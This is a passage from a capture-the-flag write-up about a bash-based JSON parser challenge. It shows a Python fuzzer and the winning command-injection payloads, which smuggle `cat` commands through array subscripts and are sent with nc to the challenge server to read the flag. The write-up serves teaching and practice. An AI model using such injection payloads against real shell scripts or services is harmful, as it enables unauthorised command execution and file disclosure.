+./parser.<span class="hljs-symbol">sh:</span> line <span class="hljs-number">21</span>: <span class="hljs-regexp">/usr/local</span><span class="hljs-regexp">/bin:/usr</span><span class="hljs-regexp">/local/sbin</span><span class="hljs-symbol">:/usr/bin</span><span class="hljs-symbol">:/usr/lib/jvm/default/bin</span><span class="hljs-symbol">:/usr/bin/site_perl</span><span class="hljs-symbol">:/usr/bin/vendor_perl</span><span class="hljs-symbol">:/usr/bin/core_perl</span>: syntax <span class="hljs-symbol">error:</span> operand expected (error token is <span class="hljs-string">"/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/lib/jvm/default/bin:/usr/bin/site_perl:/usr/bin/vendor_perl:/usr/bin/core_perl"</span>)</code></pre><p>The <code>$((suffix &gt; 0 ))</code>is instriguing. Then I write a simple fuzzer to try to solve it:</p>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python3</span>
+<span class="hljs-keyword">import</span> subprocess
+<span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> product
+seed = [
+    <span class="hljs-string">'"'</span>,
+    <span class="hljs-string">'yes'</span>,
+    <span class="hljs-string">'`yes`'</span>,
+    <span class="hljs-string">'('</span>,
+    <span class="hljs-string">'$'</span>,
+    <span class="hljs-string">'['</span>,
+    <span class="hljs-string">']'</span>,
+    <span class="hljs-string">')'</span>,
+    <span class="hljs-string">''</span>,
+    <span class="hljs-string">':'</span>,
+    <span class="hljs-string">' '</span>,
+    <span class="hljs-string">"'"</span>,
+    <span class="hljs-string">"0"</span>,
+    <span class="hljs-string">"1"</span>,
+    <span class="hljs-string">'='</span>
+]
+<span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> product(seed, seed, seed, seed):
+    p = <span class="hljs-string">''</span>.join(p)
+    <span class="hljs-keyword">if</span> <span class="hljs-string">'yes'</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> p:
+        <span class="hljs-keyword">continue</span>
+    p = <span class="hljs-string">'{'</span> + f<span class="hljs-string">'"task 1":"task _var_name_{p}","`yes`":"task var_15=13"'</span> + <span class="hljs-string">'}'</span>
+    print(repr(p))
+    s = subprocess.run([<span class="hljs-string">'./pprint.sh'</span>], input=p.encode(), capture_output=<span class="hljs-keyword">True</span>)
+    print(s)
+
+<span class="hljs-string">'''
+echo '{"task 1":"task _var_name_yes[`cat$IFS*`]","`cat$IFS*`":"task var_15=13"}' | nc json.bourne.pwni.ng 1337 | grep PCTF
+./parser.sh: line 20: PCTF{the_bourne_identity_crisis}
+'''</span></code></pre><p>The payload is simply using <code>[]</code> to perform injection. It seems like <code>[]</code> will get interpret again.</p>
+<pre class="hljs"><code>{<span class="hljs-attr">"task foo[`cat *`]"</span>:<span class="hljs-string">""</span>}</code></pre><p>You can also use double reference to solve this. Refer to <a href="https://ctftime.org/writeup/20099">mhackeroni team&#39;s write-up in CTFTime</a>.</p>
+<p>Heuristic-based fuzzing is pretty useful, isn&#39;it :)?</p>
+        </article>
+      </div>
+    </div>
+  </body>
+</html>
